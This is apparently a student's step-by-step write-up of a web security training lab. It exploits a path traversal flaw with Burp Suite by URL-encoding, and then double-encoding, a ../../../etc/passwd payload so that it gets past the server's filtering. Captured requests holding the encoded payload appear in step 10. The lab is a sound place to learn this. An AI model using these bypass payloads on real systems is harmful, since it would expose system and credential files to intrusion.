
In some contexts, such as in a URL path or the filename parameter of a multipart/form-data request, web servers may strip any directory traversal sequences before passing your input to the application. You can sometimes bypass this kind of sanitization by URL encoding, or even double URL encoding, the ../ characters. This results in %2e%2e%2f and %252e%252e%252f respectively. Various non-standard encodings, such as ..%c0%af or ..%ef%bc%8f, may also work.

## Write-up

1) lets start
2) I opened Burp-suite and immediately launched the browser in the **proxy** tab.
3) I pasted the Lab's link and intercepted it .
4) Then i chose a GET request : 

```Request in Proxy
GET /image?filename=13.jpg HTTP/2
Host: 0a6e009904051dfa81dad0f1004a00b7.web-security-academy.net
Cookie: session=fCnHEMGVGwXaQOOsbF49ze5ZLWYQa8xX
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a6e009904051dfa81dad0f1004a00b7.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=2, i
```

6) Then I sent that **GET Request** to the repeater for tweaking it a bit. 
7) I tried previous methods and it failed.
8) So, I watched a video on how to URL-encode in burp-suite, and it was quite straightforward.
9) After sending the request in Repeater tab, just type the path traversal sequence `../../../etc/passwd` like before, and select that path, **Right-click** then find **Convert** upon hovering it, you will see **URL-encode** then **encode all**.
10) It looks like this the first time:

```Request in Repeater
GET /image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64 HTTP/2
Host: 0a99006f03f55d90816a843b00600019.web-security-academy.net
Cookie: session=aSg0JHyIbwrAhaGXUtZKIaCbxEHTghi2
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a99006f03f55d90816a843b00600019.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=2, i
```

11) After sending the request we still couldn't exploit it, then i remembered that in this lab the URL gets decoded and the request get accepted. 
12) After watching the video, i was affirmed that i needed to encode that encoded path once again
13) After hitting **Send** it worked, the website had been exploited!
14) Although many things went over my head, it's fun to learn new things everyday.